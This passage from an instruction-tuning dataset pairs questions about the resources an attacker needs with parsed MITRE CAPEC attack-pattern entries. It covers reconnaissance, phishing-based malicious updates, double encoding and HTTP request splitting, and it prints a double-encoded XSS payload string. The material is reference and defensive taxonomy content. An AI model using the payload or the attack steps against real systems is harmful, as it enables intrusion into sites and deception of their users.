            "#text": "Many operating systems do not implement RFC 793 exactly and for this reason XMAS scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing the adversary from distinguishing between open and closed ports. XMAS scans are limited by the range of platforms against which they work."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Execution_Flow, Notes"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Interface Manipulation (CAPEC ID: 113)",
    "context": "",
    "output": "required resources:\nThe requirements vary depending upon the nature of the interface. For example, application-layer APIs related to the processing of the HTTP protocol may require one or more of the following: an Adversary-In-The-Middle (CAPEC-94) proxy, a web browser, or a programming/scripting language.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The requirements vary depending upon the nature of the interface. For example, application-layer APIs related to the processing of the HTTP protocol may require one or more of the following: an Adversary-In-The-Middle (CAPEC-94) proxy, a web browser, or a programming/scripting language.",
      "@Name": "Interface Manipulation (CAPEC ID: 113)",
      "attack_ptrn": {
        "@ID": "113",
        "@Name": "Interface Manipulation",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An adversary manipulates the use or processing of an interface (e.g. Application Programming Interface (API) or System-on-Chip (SoC)) resulting in an adverse impact upon the security of the system implementing the interface. This can allow the adversary to bypass access control and/or execute functionality not intended by the interface implementation, possibly compromising the system which integrates the interface. Interface manipulation can take on a number of forms including forcing the unexpected use of an interface or the use of an interface in an unintended way.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Prerequisites": {
          "Prerequisite": "The target system must expose interface functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the interface or decrypting/de-obfuscating client-server exchanges."
        },
        "Resources_Required": {
          "Resource": "The requirements vary depending upon the nature of the interface. For example, application-layer APIs related to the processing of the HTTP protocol may require one or more of the following: an Adversary-In-The-Middle (CAPEC-94) proxy, a web browser, or a programming/scripting language."
        },
        "Example_Instances": {
          "Example": [
            "An adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution.",
            "API methods not intended for production, such as debugging or testing APIs, may not be disabled when deploying in a production environment. As a result, dangerous functionality can be exposed within the production environment, which an adversary can leverage to execute additional attacks.",
            "SoC components contain insufficient identifiers, which allows an adversary to reset the device at will or read sensitive data from the device."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1192"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Name, @Status, Description, Example_Instances, Prerequisites, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses, Resources_Required"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-12-07",
              "#text": "API Abuse/Misuse"
            },
            {
              "@Date": "2020-12-17",
              "#text": "API Manipulation"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Detect Unpublicized Web Services (CAPEC ID: 144)",
    "context": "",
    "output": "The resources required to execute Detect Unpublicized Web Services (CAPEC ID: 144) are the following: Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths.",
      "@Name": "Detect Unpublicized Web Services (CAPEC ID: 144)",
      "attack_ptrn": {
        "@ID": "144",
        "@Name": "Detect Unpublicized Web Services",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary searches a targeted web site for web services that have not been publicized. This attack can be especially dangerous since unpublished but available services may not have adequate security controls placed upon them given that an administrator may believe they are unreachable.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "150",
            "Exclude_Related": [
              {
                "@Exclude_ID": "514"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find target web site] An adversary finds a target web site that they think may have unpublicized web services"
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Map the published web site] The adversary will map the published web site either by using an automated tool or by manually accessing well-known debugging or logging pages, or otherwise predictable pages within the site tree",
              "Technique": [
                "Use Dirbuster to brute force directories and file names to find unpublicized web services",
                "Find a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked"
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Try to find weaknesses or information] The adversary will try to find weaknesses in the unpublicized services that the targeted site did not intend to be public",
              "Technique": "Use Nikto to look for web service vulnerabilities"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Follow-up attack] Use any information or weaknesses found to carry out a follow-up attack"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The targeted web site must include unpublished services within its web tree. The nature of these services determines the severity of this attack."
        },
        "Resources_Required": {
          "Resource": "Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "425"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Fingerprinting (CAPEC ID: 224)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Fingerprinting (CAPEC ID: 224):\nIf on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.",
      "@Name": "Fingerprinting (CAPEC ID: 224)",
      "attack_ptrn": {
        "@ID": "224",
        "@Name": "Fingerprinting",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Most commonly, fingerprinting is done to determine operating system and application versions. Fingerprinting can be done passively as well as actively. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very Low",
        "Prerequisites": {
          "Prerequisite": "A means by which to interact with the target system directly."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument, or mouse clicking in the appropriate place on the screen."
          }
        },
        "Resources_Required": {
          "Resource": "If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": "While some information is shared by systems automatically based on standards and protocols, remove potentially sensitive information that is not necessary for the application's functionality as much as possible."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "45",
            "Entry_Name": "Fingerprinting"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Malicious Software Update (CAPEC ID: 186), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nManual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the adversary to host a payload and then trigger the installation of the payload code.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the adversary to host a payload and then trigger the installation of the payload code.",
      "@Name": "Malicious Software Update (CAPEC ID: 186)",
      "attack_ptrn": {
        "@ID": "186",
        "@Name": "Malicious Software Update",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an adversary controlled source.",
        "Extended_Description": {
          "xhtml:p": [
            "Although there are several variations to this strategy of attack, the attack methods are united in that all rely on the ability of an adversary to position and disguise malicious content such that it masquerades as a legitimate software update which is then processed by a program, undermining application integrity.",
            "As such the attack employs 'spoofing' techniques augmented by psychological or technological mechanisms to disguise the update and/or its source. Virtually all software requires frequent updates or patches, giving the adversary immense latitude when structuring the attack, as well as many targets of opportunity. Automated attacks involving malicious software updates require little to no user-directed activity and are therefore advantageous because they avoid the complex preliminary setup stages of manual attacks, which must effectively 'hook' users while avoiding countermeasures such as spam filters or web security filters."
          ]
        },
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "184"
            },
            {
              "@Nature": "CanFollow",
              "@CAPEC_ID": "98"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target] The adversary must first identify what they want their target to be. Because malicious software updates can be carried out in a variety of ways, the adversary will first not only identify a target program, but also what users they wish to target. This attack can be targeted (a particular user or group of users) or untargeted (many different users)."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Craft a deployment mechanism based on the target] The adversary must craft a deployment mechanism to deploy the malicious software update. This mechanism will differ based on if the attack is targeted or untargeted.",
              "Technique": [
                "Targeted attack: hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update.",
                "Targeted attack: Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update",
                "Untargeted attack: Spam the malicious update to as many users as possible through unsolicited email, instant messages, or social media messages.",
                "Untargeted attack: Send phishing emails to as many users as possible and pretend to be a legitimate source suggesting to download an important software update.",
                "Untargeted attack: Use trojans/botnets to aid in either of the two untargeted attacks."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Deploy malicious software update] Using the deployment mechanism from the previous step, the adversary gets a user to install the malicious software update."
            }
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "This attack requires advanced cyber capabilities"
          }
        },
        "Resources_Required": {
          "Resource": "Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the adversary to host a payload and then trigger the installation of the payload code."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Access Control",
              "Availability",
              "Confidentiality"
            ],
            "Impact": "Execute Unauthorized Commands",
            "Note": "Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials, enable a denial-of-service attack, or enable tracking."
          }
        },
        "Mitigations": {
          "Mitigation": "Validate software updates before installing."
        },
        "Example_Instances": {
          "Example": "Using an automated process to download and install dangerous code was key part of the NotPeyta attack [REF-697]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.002",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-697"
          }
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "#text": "Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system."
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Solutions_and_Mitigations, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Notes"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Extended_Description, References, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Double Encoding (CAPEC ID: 120), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nTools that automate encoding of data can assist the adversary in generating encoded strings.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Tools that automate encoding of data can assist the adversary in generating encoded strings.",
      "@Name": "Double Encoding (CAPEC ID: 120)",
      "attack_ptrn": {
        "@ID": "120",
        "@Name": "Double Encoding",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "267"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an attacker records all entry points to the application.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.",
                "Manually inspect the application to find entry points."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe entry points to locate vulnerabilities] Try double-encoding for parts of the input in order to try to get past the filters. For instance, by double encoding certain characters in the URL (e.g. dots and slashes) an adversary may try to get access to restricted resources on the web server or force browse to protected pages (thus subverting the authorization service). An adversary can also attempt other injection style attacks using this attack pattern: command injection, SQL injection, etc.",
              "Technique": "Try to use double-encoding to bypass validation routines."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.",
            "The application accepts and decodes URL string request.",
            "The application performs insufficient filtering/canonicalization on the URLs."
          ]
        },
        "Resources_Required": {
          "Resource": "Tools that automate encoding of data can assist the adversary in generating encoded strings."
        },
        "Mitigations": {
          "Mitigation": [
            "Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.",
            "Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding.",
            "When client input is required from web-based forms, avoid using the \"GET\" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the \"POST method whenever possible.",
            "Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.",
            "Refer to the RFCs to safely decode URL.",
            "Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.",
            "There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx)."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks.:",
              "Since <, <, and / are often sued to perform web attacks, these may be captured by XSS filters. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "attack",
              "#text": "%253Cscript%253Ealert('This is an XSS Attack')%253C%252Fscript%253E"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "173"
            },
            {
              "@CWE_ID": "172"
            },
            {
              "@CWE_ID": "177"
            },
            {
              "@CWE_ID": "181"
            },
            {
              "@CWE_ID": "183"
            },
            {
              "@CWE_ID": "184"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "697"
            },
            {
              "@CWE_ID": "692"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Activation_Zone, Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Spoofing of UDDI/ebXML Messages (CAPEC ID: 218), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nThe attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.",
      "@Name": "Spoofing of UDDI/ebXML Messages (CAPEC ID: 218)",
      "attack_ptrn": {
        "@ID": "218",
        "@Name": "Spoofing of UDDI/ebXML Messages",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "148",
            "Exclude_Related": [
              {
                "@Exclude_ID": "512"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted business's UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit."
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services."
        },
        "Mitigations": {
          "Mitigation": "Implementation: Clients should only trust UDDI, ebXML, or similar messages that are verifiably signed by a trusted party."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "345"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2019-04-04",
            "Modification_Comment": "Updated Related_Attack_Patterns"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: HTTP Request Splitting (CAPEC ID: 105)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern HTTP Request Splitting (CAPEC ID: 105):\nTools capable of crafting malicious HTTP messages and monitoring HTTP messages responses.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Tools capable of crafting malicious HTTP messages and monitoring HTTP messages responses.",
      "@Name": "HTTP Request Splitting (CAPEC ID: 105)",
      "attack_ptrn": {
        "@ID": "105",
        "@Name": "HTTP Request Splitting",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to split a single HTTP request into multiple unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server).",
            "See CanPrecede relationships for possible consequences."
          ]
        },
        "Extended_Description": {
          "xhtml:p": [
            "This entails the adversary injecting malicious user input into various standard and/or user defined HTTP headers within a HTTP Request through user input of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters and unique character encoding. This malicious user input allows for web script to be injected in HTTP headers as well as into browser cookies or Ajax web/browser object parameters like XMLHttpRequest during implementation of asynchronous requests.",
            "This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions as well as lack of syntax checking and filtering of user input in the HTTP agents receiving HTTP messages in the path.",
            {
              "xhtml:i": "back-end HTTP agent",
              "#text": "This differs from CAPEC-34 HTTP Response Splitting, which is usually an attempt to compromise a client agent (e.g., web browser) by sending malicious content in HTTP responses from back-end HTTP infrastructure. HTTP Request Splitting is an attempt to compromise avia HTTP Request messages."
            },
            "HTTP Smuggling (CAPEC-33 and CAPEC-273) is different from HTTP Splitting due to the fact it relies upon discrepancies in the interpretation of various HTTP Headers and message sizes and not solely user input of special characters and character encoding. HTTP Smuggling was established to circumvent mitigations against HTTP Request Splitting techniques."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "220"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "34"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "593"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "154"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.",
              "Technique": "Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
